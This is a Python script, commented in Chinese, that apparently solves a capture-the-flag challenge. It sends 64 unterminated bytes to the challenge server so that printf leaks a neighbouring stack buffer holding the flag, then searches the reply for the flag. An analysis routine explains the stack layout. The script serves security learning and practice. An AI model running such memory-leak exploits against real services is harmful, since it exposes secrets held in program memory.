#!/usr/bin/env python3
import socket
import sys

def exploit():
    # 连接到目标服务器
    host = "whats-my-name.chall.edgesecurity.team"
    port = 1342
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        print("[+] Connected to target server")
        
        # 接收初始输出
        data = s.recv(4096)
        print("Received banner:")
        print(data.decode('utf-8', errors='ignore'))
        
        # 漏洞分析：
        # 1. read(STDIN_FILENO, input_buffer, MAX_NAME) 读取64字节，无null终止符
        # 2. strncpy(output, input_buffer, MAX_NAME) 复制64字节，仍无null终止符  
        # 3. printf("Your flipped name is: %s\n", output) 会继续读取直到null
        # 4. 栈布局：flag在栈的更高地址，可能被泄露
        
        # 构造payload：发送64字节数据，不包含null终止符
        # 让printf的%s继续读取，泄露栈上的flag数据
        payload = b"a" * 64  # 64字节，填满input_buffer，无null终止符
        
        print(f"[+] Sending payload: {len(payload)} bytes without null terminator")
        s.send(payload)
        
        # 接收响应，可能包含泄露的flag
        response = s.recv(4096)
        print("\n[+] Server response:")
        response_str = response.decode('utf-8', errors='ignore')
        print(response_str)
        
        # 分析响应中的flag
        lines = response_str.split('\n')
        for line in lines:
            if "Your flipped name is:" in line:
                # 提取可能的flag
                flipped_output = line.split("Your flipped name is: ")[1]
                print(f"\n[+] Flipped output: {repr(flipped_output)}")
                
                # 查找flag格式（可能包含edge{或flag{）
                if "edge{" in flipped_output.lower():
                    print(f"[!] Found potential flag: {flipped_output}")
                elif "flag{" in flipped_output.lower():  
                    print(f"[!] Found potential flag: {flipped_output}")
                else:
                    print("[-] No obvious flag format found, but memory leak occurred")
                    # 检查是否有额外的字符泄露
                    if len(flipped_output) > 64:
                        leaked_data = flipped_output[64:]
                        print(f"[+] Leaked data: {repr(leaked_data)}")
                break
            
        s.close()
        
    except Exception as e:
        print(f"[!] Error: {e}")
        if 's' in locals():
            s.close()

def analyze_vulnerability():
    """分析漏洞原理"""
    print("漏洞分析")
    print("1. 程序使用read()读取64字节到input_buffer，不添加null终止符")
    print("2. strncpy()复制64字节到output，仍然没有null终止符")  
    print("3. flip_case()函数依赖null终止符来结束循环，可能会处理栈上的额外数据")
    print("4. printf('%s')会继续读取直到遇到null字符，可能泄露flag")
    print("5. 栈布局：flag存储在super_secret_open_ai_api_key_powering_the_flipper中")
    print("\n变量在栈上的布局（从高地址到低地址）：")
    print("- super_secret_open_ai_api_key_powering_the_flipper[64] <- flag在这里")
    print("- output[64]") 
    print("- input_buffer[64]")
    print("\n如果output没有null终止符，printf可能会读取到flag数据！")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "analyze":
        analyze_vulnerability()
    else:
        exploit()